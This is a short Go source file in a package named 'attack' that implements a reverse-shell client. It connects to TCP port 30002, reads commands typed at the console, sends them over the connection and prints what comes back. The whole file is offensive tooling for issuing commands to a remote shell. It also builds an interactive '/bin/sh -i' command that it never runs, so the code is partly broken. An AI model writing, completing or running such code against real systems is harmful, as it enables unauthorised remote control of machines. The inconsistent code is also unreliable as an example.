package attack

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

func ReverseShellClient() {
	conn, err := net.Dial("tcp", ":30002")
	if err != nil {
		fmt.Println("err : ", err)
		return
	}
	defer conn.Close()
	inputReader := bufio.NewReader(os.Stdin)
	for {
		input, _ := inputReader.ReadString('\n')
		fmt.Println("輸入命令:", input)
		if strings.ToUpper(input) == "Q\n" {
			return
		}

		_, writeErr := conn.Write([]byte(input)) //Send Command Line
		if writeErr != nil {
			return
		}
		buf := [512]byte{}

		var stderr bytes.Buffer
		cmd := exec.Command("/bin/sh", "-i")
		cmd.Stderr = &stderr

		readlens, readErr := conn.Read(buf[:])
		if readErr != nil {
			fmt.Println("recv failed, err:", readErr)
			return
		}
		fmt.Println(string(buf[:readlens]))
	}
}
